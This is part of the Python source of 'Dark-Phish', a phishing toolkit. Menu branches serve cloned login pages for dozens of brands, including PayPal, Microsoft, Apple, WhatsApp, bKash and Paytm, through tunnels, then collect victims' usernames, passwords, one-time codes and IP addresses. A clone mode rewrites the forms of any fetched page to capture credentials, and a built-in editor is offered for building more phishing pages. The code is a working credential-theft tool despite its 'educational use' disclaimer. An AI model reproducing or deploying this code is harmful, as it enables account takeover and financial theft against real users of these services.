		username, password = extract_data(log)

		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif(option==9):
	try:
		site = "PayPal"
		available_tunnels()
		os.chdir("core/sites/PayPal")
		server("PayPal")
		work()
		log=work()
		otp = ""
		
		username, password = extract_data(log)

		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
				pass
		save_data(site, username, password, otp)
	except Exception as error:
			print(error)
			
elif(option==10):
			try:
				site = "Microsoft"
				available_tunnels()
				os.chdir("core/sites/Microsoft")
				server("Microsoft")
				work()
				log=work()
				username = ""
				password = ""
				otp = ""
				
				username, password = extract_data(log)
			
				stop()
				ip_data()
				try:
					os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)

elif (option==11):
			try:
				site = "Dropbox"
				available_tunnels()
				os.chdir("core/sites/Dropbox")
				server("Dropbox")
				work()
				log=work()
				username = ""
				password = ""
				otp = ""
				username, password = extract_data(log)
				stop()
				ip_data()
				try:
					os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)
			
			
elif (option==12):
			try:
				site = "Apple"
				available_tunnels()
				os.chdir("core/sites/Apple")
				server("Apple")
				work()
				log=work()
				username = ""
				password = ""
				otp = ""
				username, password = extract_data(log)
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)
			
			
elif (option==13):
			try:
				site = "Samsung"
				available_tunnels()
				os.chdir("core/sites/Samsung")
				server("Samsung")
				work()
				log=work()
				username = ""
				password = ""
				otp = ""
				username, password = extract_data(log)
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)


elif (option==14):
			try:
				site = "WordPress"
				available_tunnels()
				os.chdir("core/sites/WordPress")
				server("WordPress")
				work()
				log=work()
				otp=""
				username, password = extract_data(log)
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
						pass
				save_data(site, username, password, otp)
			except Exception as error:
					print(error)
			
			
elif (option==15):
			try:
				site = "GitLab"
				available_tunnels()
				os.chdir("core/sites/GitLab")
				server("GitLab")
				work()
				log=work()
				otp = ""
				username, password = extract_data(log)
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)
			
elif (option==16):
			try:
				site = "ProtonMail"
				available_tunnels()
				os.chdir("core/sites/ProtonMail")
				server("ProtonMail")
				work()
				log=work()
				otp = ""
				username, password = extract_data(log)
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)
			
elif (option==17):
			try:
				site = "Linkedin"
				available_tunnels()
				os.chdir("core/sites/Linkedin")
				server("Linkedin")
				work()
				log=work()
				otp = ""
				username, password = extract_data(log)
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)
			
elif (option==18):
			try:
				site = "Steam"
				available_tunnels()
				os.chdir("core/sites/Steam")
				server("Steam")
				work()
				log=work()
				otp = ""

				username, password = extract_data(log)

				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)
			
elif (option==19):
			try:
				site = "Twitch"
				available_tunnels()
				os.chdir("core/sites/Twitch")
				server("Twitch")
				work()
				log=work()
				otp = ""

				username, password = extract_data(log)
					
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)
			
elif (option==20):
			try:
				site = "VK"
				available_tunnels()
				os.chdir("core/sites/VK")
				server("VK")
				work()
				log=work()
				otp = ""

				username, password = extract_data(log)
					
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)

elif (option==21):
	try:
		site = "Pinterest"
		available_tunnels()
		os.chdir("core/sites/Pinterest")
		server("Pinterest")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)
					
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
elif (option==22):
			try:
				site = "Wi-Fi"
				available_tunnels()
				os.chdir("core/sites/Wi-Fi")
				server("Wi-Fi")
				work()
				log=work()
				otp = ""

				username, password = extract_data(log)
					
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except:
					pass
				save_data(site, username, password, otp)
			except Exception as error:
				print(error)

elif (option==23):
	try:
		site = "Badoo"
		available_tunnels()
		os.chdir("core/sites/Badoo")
		server("Badoo")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)

		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==24):
	try:
		site = "Bitcoin"
		available_tunnels()
		os.chdir("core/sites/Bitcoin")
		server("Bitcoin")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)

		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==25):
	try:
		site = "Adobe"
		available_tunnels()
		os.chdir("core/sites/Adobe")
		server("Adobe")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)

		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==26):
	try:
		site = "Amazon"
		available_tunnels()
		os.chdir("core/sites/Amazon")
		server("Amazon")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)
		
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==27):
	try:
		site = "Ebay"
		available_tunnels()
		os.chdir("core/sites/Ebay")
		server("Ebay")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)
		
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==28):
	try:
		site = "Netflix"
		available_tunnels()
		os.chdir("core/sites/Netflix")
		server("Netflix")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)
				
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==29):
	try:
		site = "Messenger"
		available_tunnels()
		os.chdir("core/sites/Messenger")
		server("Messenger")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		

elif (option==30):
	try:
		site = "X"
		available_tunnels()
		os.chdir("core/sites/X")
		server("X")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==31):
	try:
		site = "Galaxy_Store"
		available_tunnels()
		os.chdir("core/sites/Galaxy_Store")
		server("Galaxy_Store")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)


elif (option==32):
	try:
		site = "Google_Drive"
		available_tunnels()
		os.chdir("core/sites/Google_Drive")
		server("Google_Drive")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==33):
	try:
		site = "Google_Photos"
		available_tunnels()
		os.chdir("core/sites/Google_Photos")
		server("Google_Photos")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==34):
	try:
		site = "OneDrive"
		available_tunnels()
		os.chdir("core/sites/OneDrive")
		server("OneDrive")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()#timestamp = time.strftime("%H:%M:%S", time.localtime())

		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==35):
	try:
		site = "PlayStore"
		available_tunnels()
		os.chdir("core/sites/PlayStore")
		server("PlayStore")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==36):
	try:
		site = "Snaptube"
		available_tunnels()
		os.chdir("core/sites/Snaptube")
		server("Snaptube")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==37):
	try:
		site = "Spotify"
		available_tunnels()
		os.chdir("core/sites/Spotify")
		server("Spotify")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==38):
	try:
		site = "TikTok"
		available_tunnels()
		os.chdir("core/sites/TikTok")
		server("TikTok")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==39):
	try:
		site = "Discord"
		available_tunnels()
		os.chdir("core/sites/Discord")
		server("Discord")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==40):
	try:
		site = "Daraz"
		available_tunnels()
		os.chdir("core/sites/Daraz")
		server("Daraz")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
				os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		

elif (option==41):
	try:
		site = "Whatsapp"
		available_tunnels()
		os.chdir("core/sites/Whatsapp")
		server("Whatsapp")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		

elif (option==42):
	try:
		site = "Telegram"
		available_tunnels()
		os.chdir("core/sites/Telegram")
		server("Telegram")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==43):
	try:
		site = "Signal"
		available_tunnels()
		os.chdir("core/sites/Signal")
		server("Signal")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==44):
	try:
		site = "Imo"
		available_tunnels()
		os.chdir("core/sites/Imo")
		server("Imo")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==45):
	try:
		site = "Bkash"
		available_tunnels()
		os.chdir("core/sites/Bkash")
		server("Bkash")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==46):
	try:
		site = "Nagad"
		available_tunnels()
		os.chdir("core/sites/Nagad")
		server("Nagad")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==47):
	try:
		site = "Rocket"
		available_tunnels()
		os.chdir("core/sites/Rocket")
		server("Rocket")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==48):
	try:
		site = "Paytm"
		available_tunnels()
		os.chdir("core/sites/Paytm")
		server("Paytm")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		

elif (option==49):
	try:
		site = "Flipkart"
		available_tunnels()
		os.chdir("core/sites/Flipkart")
		server("Flipkart")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
		
elif (option==50):
	try:
		site = "PhonePe"
		available_tunnels()
		os.chdir("core/sites/PhonePe")
		server("PhonePe")
		username, password, otp = work_otp()
		stop()
		ip_data()
		try:
				os.remove("log.txt")
				os.remove("otp.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)


elif (option == "clone"):
	def clone_webpage(url, action_url):
		headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
		def create_login_php(action_url):
			if os.path.exists("core/sites/clone/login.php"):
				os.remove("core/sites/clone/login.php")
			else:
				pass
			if not action_url:
				action_url = "https://www.google.com"
			try:
				code = login_php(action_url)
				file = open("core/sites/clone/login.php", "w")
				file.write(code)
				file.close()
			except Exception as error:
				printf(error, level="ERROR")


		if not os.path.exists("core/sites/clone"):
			os.mkdir("core/sites/clone")
		else:
			pass
		if os.path.exists("core/sites/clone/index.html") == True:
			os.remove("core/sites/clone/index.html")
		else:
			pass

		create_login_php(action_url)

		if not os.path.exists("core/sites/clone/ip.php"):
			file = open("core/sites/clone/ip.php", "w")
			ip_code = ip_php()
			file.write(ip_code)
			file.close()
		
		else:
			pass
		
		if not os.path.exists("core/sites/clone/index.php"):
			index_code = index_php()
			file = open("core/sites/clone/index.php", "w")
			file.write(index_code)
			file.close()
		else:
			pass
		
		try:
			printf("Cloning the webpage...", level="INFO")
			response = requests.get(url, headers=headers)
			response.raise_for_status()
			content = response.text
			soup = BeautifulSoup(content, "html.parser")
			form_data = soup.find("form")
			if form_data:
				for form in soup.find_all("form"):
					form["action"] = "login.php"
					form["method"] = "POST"
			
			
				file = open("core/sites/clone/index.html", "w")
				file.write(str(soup))
				file.close()
				printf("Injected phishing action into the form.", level="INFO")
			else:
				printf("No form found in the HTML.", level="WARNING")
		except Exception as error:
			printf("Failed to clone the webpage. Error: {}".format(error), level="ERROR")
			sys.exit()
	print("""\n\033[1;93mNote: It may not detect or capture credentials from all websites, especially those with complex or dynamic forms.\033[0;0m\n""")
	try:
		url = input("\nEnter the URL of the webpage: ")
		action_url = input("Enter the action URL: ")
	except Exception as error:
		printf(error, level="ERROR")
		sys.exit()

	print("")
	clone_webpage(url, action_url)
	site = "clone"
	available_tunnels()
	os.chdir("core/sites/clone")
	server(site)
	display_credentials()
	stop()
	ip_data()
	try:
		os.remove("log.txt")
	except:
		pass

		


elif (option == "custom"):
				site = "Custom"
				if (tunnel == 0):
					sys.exit()
					pass
				text1=input("\nText 1 (Default: System failed): ")
				if text1=="":
					text1="System failed"
				else:
					pass
				text2=input("Text 2 (Default: Log in again): ")
				if text2=="":
					text2="Log in again"
				else:
					pass
				user_text=input("Username place (Default: Username): ")
				if user_text=="":
					user_text="Username"
				else:
					pass
				pass_text=input("Password place (Default: Password): ")
				if pass_text=="":
					pass_text="Password"
				else:
					pass
				button_text=input("Button place (Default: Log in): ")
				if button_text=="":
					button_text="Log in"
				else:
					pass
				script=""
				script=input("Add alert massage (y/n): ").lower()
				if script=="y":
					script="""<script>alert("{}")</script>"""
					massage=input("Alert massage (Default: Session expired!): ")
					if massage=="":
						massage="Session expired!"
					else:
						pass
					script=script.format(massage)
				else:
					pass

				data=("""
<!DOCTYPE html>
<html>
<body bgcolor="White" text="Black">
	<center>
	<h1>"""+text1+"""</h1>
	<h2>"""+text2+"""</h2>
<style>
input {
	border: 1px solid gray;
	border-radius: 4px;
	margin: 3px;
	}
</style>
<style>
button {
	background-color: white;
	color: black;
	border: 1px solid black;
	padding: 1px 18px;
	}
</style>
"""+script+"""
<form method="POST" action="login.php">
<label>"""+user_text+"""</label>
<input type="text" name="username"></input>
<br>
<label>"""+pass_text+"""</label>
<input type="password" name="password"></input>
<br><br>
<button type="submit">"""+button_text+"""</button>
</form>
</center>
</body>
</html>
""")
				file=open("core/sites/Custom/index.html","w")
				file.write(data)
				file.close()
				  
				available_tunnels()
				os.chdir("core/sites/Custom")
				server("Custom")
				work()
				log=work()
				username, password = extract_data(log)
				otp = ""
				stop()
				ip_data()
				try:
						os.remove("log.txt")
				except Exception as error:
					print(error)
				try:
					save_data(site, username, password, otp)
				except:
					pass

elif (option=="create"):
	def create_folder():
		exists = os.path.exists("core/sites/create")
		if not exists:
			try:
				os.mkdir("core/sites/create")
			except Exception as error:
				print(error)
				sys.exit()
		else:
			pass
	
	def server_files():
		if not os.path.exists("core/sites/create/login.php"):
			action_url = input("Enter the action URL: ")
			with open("core/sites/create/login.php", "w") as file:
				file.write(login_php(action_url))
		else:
			pass
		if not os.path.exists("core/sites/create/index.php"):
			with open("core/sites/create/index.php", "w") as file:
				file.write(index_php())
		else:
			pass
		if not os.path.exists("core/sites/create/ip.php"):
			with open("core/sites/create/ip.php", "w") as file:
				file.write(ip_php())
		else:
			pass
	
	def save_directory():
		action = input("Do you want to save the code for later use? (y/N): ").lower()
		folderpath = "core/sites/create/temp"
		if not os.path.exists(folderpath):
			os.mkdir(folderpath)
		else:
			pass
		while True:

			if action == "y" or action == "yes":
				folder = input("\nEnter the directory name: ")
				folderpath = "core/sites/create/{}".format(folder)
				if not os.path.exists(folderpath):
					os.mkdir(folderpath)
					break
				elif os.path.exists(folderpath):
					print("\033[1;91mThe directory already exists!\033[0;0m")
				else:
					pass
			if action == "n" or action == "no" or action == "":
				folderpath = folderpath
				break
			else:
				pass

		shutil.move("core/sites/create/index.html", folderpath)
		shutil.move("core/sites/create/login.php", folderpath)
		shutil.move("core/sites/create/index.php", folderpath)
		shutil.move("core/sites/create/ip.php", folderpath)

		return folderpath
	
	def delete_directory(folders):

		while True:
			try:
				delete = False
				if len(folders) == 0:
					print("\033[1;91mNo directories available to delete.\033[0;0m")
				print("\n\nSelect a directory to delete")
				for number, folder in enumerate(folders, start=1):
					print("[\033[1;92m{}\033[0;0m] {}".format(number, folder))
				print("[\033[1;92m00\033[0;0m] Cancel")
				option = input("\nOPTION: ").lower()
				if int(option) == 0:
					print("[{}] Delete canceled.".format(time.strftime("%H:%M:%S", time.localtime())))
					return
				try:
					option = int(option) - 1
				except:
					print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
				
				directory = "core/sites/create/{}".format(folders[option])
				confirm = input(f"Delete '{folders[option]}'? (y/N): ").lower()

				if confirm in ["y", "yes"]:
					try:
						shutil.rmtree(directory)
						print("\033[1;92m[{}] Directory '{}' deleted successfully.\033[0;0m".format(time.strftime("%H:%M:%S", time.localtime()), folders[option]))
					except Exception as error:
						print(f"\033[1;91mFailed to delete directory: {error}\033[0;0m")
				else:
					print("[{}] Delete canceled.".format(time.strftime("%H:%M:%S", time.localtime())))
			except Exception as error:
				print(error)

	create_folder()

	if os.path.exists("core/sites/create/temp/index.html"):
		os.remove("core/sites/create/temp/index.html")
	if os.path.exists("core/sites/create/temp/login.php"):
		os.remove("core/sites/create/temp/login.php")
	if os.path.exists("core/sites/create/temp/index.php"):
		os.remove("core/sites/create/temp/index.php")
	if os.path.exists("core/sites/create/temp/ip.php"):
		os.remove("core/sites/create/temp/ip.php")
	if os.path.exists("core/sites/create/temp"):
		os.rmdir("core/sites/create/temp")


	folders = [f for f in os.listdir("core/sites/create") if os.path. isdir(os.path.join("core/sites/create",f))]
	print("")
	print("[\033[1;92mnew\033[0;0m] Create New")
	print("[\033[1;92mdlt\033[0;0m] Delete")
	for number, folder in enumerate(folders, start=1):
		print("[\033[1;92m{}\033[0;0m] {}".format(number, folder))
	print("[\033[1;92m00\033[0;0m] Exit")
	while True:
		try:
			create_new = False
			option = input("\nOPTION: ").lower()
			if option == "new":
				create_new = True
				break
			elif option == "dlt" or option == "delete":
				delete_directory(folders)
			elif int(option) == 0:
				sys.exit()
			else:
				pass
			try:
				option = int(option) - 1
			except:
				pass
			break
		except Exception as error:
			print(error)

	if create_new == False:
		directory_name = folders[option] 
		existing_path = "core/sites/create/{}".format(directory_name)
	else:
		pass

	
	
	if create_new == True:
		server_files()
	else:
		pass

	def code_editor():
		def newfile(event=None):
			global file
			root.title(f"Dark-Phish v{version} - Code Editor")
			file = None
			text_area.delete(1.0, END)

		def savefile(event=None):
			path = "core/sites/create/index.html"
			try:
				with open(path, "w") as file:
					file.write(text_area.get(1.0, END))
					messagebox.showinfo("File Saved", f"File saved as 'index.html'")
					root.destroy()
			except Exception as error:
				messagebox.showerror("Error", f"Failed to save the file: {error}")

		def exit_editor(event=None):
			root.destroy()

		def cut():
			text_area.event_generate(("<<Cut>>"))
		def copy():
			text_area.event_generate(("<<Copy>>"))
		def paste():
			text_area.event_generate(("<<Paste>>"))
		
		def show_about():
			about_box = Toplevel(root)
			about_box.geometry("400x250")
			icon = PhotoImage(file="core/icon.png")
			about_box.iconphoto(False, icon)
			about_box.title("About - Dark-Phish Code Editor")
			about_box.config(bg="#2c3e50")

			Label(about_box, text="Dark-Phish Code Editor", font=("Arial", 14, "bold"), bg="#2c3e50", fg="white").pack(pady=10)
			Label(about_box, text="Version {}".format(version), font=("Arial", 10), bg="#2c3e50", fg="white").pack(pady=5)
			Label(about_box, text="Coded by LM Sajjad", font=("Arial", 10, "italic"), bg="#2c3e50", fg="white").pack(pady=5)
			Label(about_box, text="Disclaimer: This tool is for educational and ethical use only. "
			"Unauthorized or illegal activities are prohibited. The author disclaims any "
			"responsibility for misuse or legal consequences. Ensure proper authorization "
			"before conducting any security-related activities.",
			font=("Helvetica", 8), bg="#2c3e50", fg="red", wraplength=280, justify="left").pack(pady=10)

			Button(about_box, text="Close", command=about_box.destroy, font=("Helvetica", 10, "bold"), bg="#e74c3c", fg="white").pack(pady=10)

		def show_help():
			help_box = Toplevel(root)

			#help_box.geometry("500x300")
			icon = PhotoImage(file="core/icon.png")
			help_box.iconphoto(False, icon)
			help_box.config(bg="white")

			Label(help_box, text="Help - Dark-Phish Code Editor", font=("Arial", 14, "bold"), bg="white").pack(pady=10)

			help_text = (
				"Editing Web Pages:\n"
				"   - Use this editor to write or modify HTML code for the web pages you wish "
				"to use in your phishing scenarios.\n"
				"   - The form tag must include the attributes:\n"
				'     action="login.php" and method="POST" to capture the credentials.\n'
				'     example: <form method="POST" action="login.php"></form>\n\n'

				"Saving Files:\n"
				"   - Press CTRL+S or go to the 'Menu' and click 'Save' to save your file.\n"
				"   - The file will be saved as 'index.html' in the 'core/sites/create' folder.\n\n"

				"Exiting:\n"
				"   - Press CTRL+Q or go to the 'Menu' and click 'Exit' to close the editor.\n\n"

				"Additional Actions:\n"
				"   - You can cut, copy, and paste text using the 'Edit' menu options."
				)

			Label(help_box, text=help_text, font=("Arial", 12), bg="white", anchor="w", justify=LEFT, wraplength=480).pack(pady=10, padx=10)
			Button(help_box, text="Close", command=help_box.destroy, bg="#2c3e50", fg="white").pack(pady=10)

		root = Tk()
		root.geometry("600x400")
		root.title(f"Dark-Phish v{version} - Code Editor")

		icon = PhotoImage(file="core/icon.png")
		root.iconphoto(False, icon)

		note = Label(root, text="""Ensure that the form tag includes action=\"login.php\" and method=\"POST\"""").pack(fill="x")

		text_area = Text(root, wrap="word")
		text_area.pack(expand=True, fill="both")

		instructions = Label(root, text="Press CTRL+S to save, CTRL+Q to quit")
		instructions.pack()

		root.bind("<Control-s>", savefile)
		root.bind("<Control-q>", exit_editor)

		# Adding Menu to the menu bar
		menu_bar = Menu(root)
		FileMenu = Menu(menu_bar, tearoff=0)
		FileMenu.add_command(label="New", command=newfile)
		FileMenu.add_command(label="Save", command=savefile)
		FileMenu.add_separator()
		FileMenu.add_command(label="Exit", command=exit_editor)
		menu_bar.add_cascade(label="Menu", menu=FileMenu)

		# Adding Edit section to the menu bar
		EditMenu = Menu(menu_bar, tearoff=0)
		EditMenu.add_command(label="Cut", command=cut)
		EditMenu.add_command(label="Copy", command=copy)
		EditMenu.add_command(label="Paste", command=paste)
		menu_bar.add_cascade(label="Edit", menu=EditMenu)

		# Adding Help and About sections to the menu bar
		HelpMenu = Menu(menu_bar, tearoff=0)
		HelpMenu.add_command(label="Help", command=show_help)
		HelpMenu.add_command(label="About", command=show_about)
		menu_bar.add_cascade(label="Help", menu=HelpMenu)


		root.config(menu=menu_bar)

		Scroll = Scrollbar(text_area)
		Scroll.pack(side=RIGHT, fill=Y)
		Scroll.config(command=text_area.yview)
		text_area.config(yscrollcommand=Scroll.set)

		root.mainloop()

	if create_new == True:
		code_editor()
		filespath = save_directory()
	elif create_new == False:
		filespath = existing_path
	else:
		pass
	site = os.path.basename(filespath)
	folder_path = filespath
	available_tunnels()
	os.chdir(folder_path)
	server(site)
	display_credentials()
	stop()
	ip_data()
	try:
		os.remove("log.txt")
	except:
		pass





elif (option==00):
	print("")
	sys.exit()

			
else:
	print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
	
